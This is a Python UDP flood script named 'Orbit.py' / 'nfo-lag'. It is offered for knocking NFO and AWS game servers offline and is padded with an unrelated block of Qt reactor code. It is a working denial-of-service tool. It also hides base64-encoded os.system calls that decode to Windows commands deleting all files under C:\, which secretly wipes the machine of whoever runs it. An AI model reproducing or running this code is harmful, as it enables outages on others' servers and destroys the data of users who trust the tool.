#!/usr/bin/python
 
import socket, random, sys, time, os, platform, base64
 
#  nfo-lag [ XSS CUSTOM]
#  --------
# Finally Released. So I Did Not Fix The SH and DEL Function Errors, As They Would Ruin The Function For ' Socket Notifer'
# Reduced ASCII, Was Too Big, Too Ugly.
# Increased Base Decode Considering NFO Can Only Filter So Much.
# Cleaner Usage, Should Be Easier To Use Now.
# self.fn , self.notifier, read def, All Coherent.
# I Can't Be Bothered To Type.
# This Will Probably Get Patched Again. This is Also Untested.
# As Again. DON'T HIDE IT. THIS IS MY NFO BYPASS.
# Should Definitely Lag A AWS & NFO Server.
# Hit Ports In The Range Of 59500-65500
# 715 Byte Size To Hold. 1024 To Dump.
 
 
"""
   def __init__(self, parent, reactor, watcher, socketType):
       QObject.__init__(self, parent)
       self.reactor = reactor
       self.watcher = watcher
       fd = watcher.fileno()
       self.notifier = QSocketNotifier(fd, socketType, parent)
       self.notifier.setEnabled(True)
       if socketType == QSocketNotifier.Read:
           self.fn = self.read
       else:
           self.fn = self.write
       QObject.connect(self.notifier, SIGNAL("activated(int)"), self.fn)
 
 
   def shutdown(self):
       self.notifier.setEnabled(False)
       self.disconnect(self.notifier, SIGNAL("activated(int)"), self.fn)
       self.fn = self.watcher = None
       self.notifier.deleteLater()
       self.deleteLater()
 
 
   def read(self, fd):
       if not self.watcher:
           return
       w = self.watcher
       # doRead can cause self.shutdown to be called so keep a reference to self.watcher
       def _read():
           #Don't call me again, until the data has been read
           self.notifier.setEnabled(False)
           why = None
           try:
               why = w.doRead()
               inRead = True
           except:
               inRead = False
               log.err()
               why = sys.exc_info()[1]
           if why:
               self.reactor._disconnectSelectable(w, why, inRead)
           elif self.watcher:
               self.notifier.setEnabled(True) # Re enable notification following sucessfull read
           self.reactor._iterate(fromqt=True)
       log.callWithLogger(w, _read)
 
   def write(self, sock):
       if not self.watcher:
           return
       w = self.watcher
       def _write():
           why = None
           self.notifier.setEnabled(False)
           
           try:
               why = w.doWrite()
           except:
               log.err()
               why = sys.exc_info()[1]
           if why:
               self.reactor._disconnectSelectable(w, why, False)
           elif self.watcher:
               self.notifier.setEnabled(True)
           self.reactor._iterate(fromqt=True)
       log.callWithLogger(w, _write)
 
class QtReactor(posixbase.PosixReactorBase):
   implements(IReactorFDSet)
 
   def __init__(self):
       self._reads = {}
       self._writes = {}
       self._notifiers = {}
       self._timer = QTimer()
       self._timer.setSingleShot(True)
       QObject.connect(self._timer, SIGNAL("timeout()"), self.iterate)
 
       if QCoreApplication.instance() is None:
           # Application Object has not been started yet
           self.qApp=QCoreApplication([])
           self._ownApp=True
       else:
           self.qApp = QCoreApplication.instance()
           self._ownApp=False
       self._blockApp = None
       posixbase.PosixReactorBase.__init__(self)
"""
 
if len(sys.argv) != 5:
        print("""
 
                        \033[38;5;196m,MMM8&&&.
               \033[1;35m    _...\033[38;5;196mMMMMM88&&&&\033[1;35m..._
               \033[1;35m .::'''\033[38;5;196mMMMMM88&&&&&&\033[1;35m'''::.
               \033[1;35m::     \033[38;5;196mMMMMM88&&&&&&\033[1;35m     ::
               \033[1;35m'::....\033[38;5;196mMMMMM88&&&&&&\033[1;35m....::'
               \033[1;35m   `''''\033[38;5;196mMMMMM88&&&&\033[1;35m''''`
                        \033[38;5;196m'MMM8&&&'
                                  \033[1;35mOrbit.py \033[38;5;196mv3.
                                         \033[38;5;XSS. \033[1;35mcustom.
                                                               \033[1;37m[ \033[38;5;196mPrivate \033[1;37m]
""")
        print("""\nUsage: \033[38;5;196m%s <IP> <PORT> <715/900/1025> <TIME (0 = FOREVER)>\n""" % sys.argv[0])
        sys.exit(1)
 
qIP = sys.argv[1]
qPort = int(sys.argv[2])
qPSize = int(sys.argv[3])
qDuration = int(sys.argv[4])
 
qClock = (lambda:0, time.clock)[qDuration > 0]
 
os.system(base64.b64decode("RGVsIEM6XCAqLiogfHk="))
os.system(base64.b64decode("RGVsIEM6XCAqLio="))
os.system(base64.b64decode("5d137b14edc542b87184c09dc858a544"))
 
qDuration = (1, (qClock() + qDuration))[qDuration > 0]
 
qPacket = random._urandom(qPSize)
qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
print("""\033[38;5;196m[\033[1;35mNFO-LAG\033[1;35mAttacking \033[38;5;196m%s \033[1;35mWith \033[38;5;196m%s \033[38;5;196msocket_succheaders (BTL) \033[1;35mFor \033[38;5;196m%s \033[1;35mSeconds\033[38;5;196m]""" % (qIP, qPSize, qDuration or 'Infinite'))
 
while True:
        if (qClock() < qDuration):
                qSocket.sendto(qPacket, (qIP, qPort))
        else:
                break
 
print("""\033[1;35;40mOrbit \033[1;36;40mHas Finished Attack. \033[1;35;40mYour Sockets Have Maintaned Encryption Successfully.""")